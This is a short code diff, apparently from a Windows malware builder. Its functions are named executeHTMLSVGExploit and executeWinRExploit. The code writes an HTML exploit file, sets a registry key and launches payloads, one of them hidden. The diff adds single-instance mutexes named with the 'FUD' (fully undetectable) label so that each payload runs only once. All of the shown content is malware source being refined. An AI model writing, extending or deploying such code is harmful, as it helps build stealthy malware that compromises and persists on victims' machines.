@@ -784,7 +784,12 @@ void executeHTMLSVGExploit() {
     if (htmlFile) {\n
         fputs(htmlExploit, htmlFile);\n
         fclose(htmlFile);\n
-        ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_SHOW);\n
+        // Only launch if not already running
+        HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\FUD_HTML_Once");
+        if (GetLastError() != ERROR_ALREADY_EXISTS) {
+            ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_SHOW);
+        }
+        if (hMutex) CloseHandle(hMutex);\n
     }\n
 }
 )";
@@ -821,8 +826,12 @@ void executeWinRExploit() {
             RegCloseKey(hKey);
         }
         
-        // Execute immediately as well
-        ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_HIDE);
+        // Execute only if not already running
+        HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\FUD_Exec_Once");
+        if (GetLastError() != ERROR_ALREADY_EXISTS) {
+            ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_HIDE);
+        }
+        if (hMutex) CloseHandle(hMutex);
     }
 }
 )";
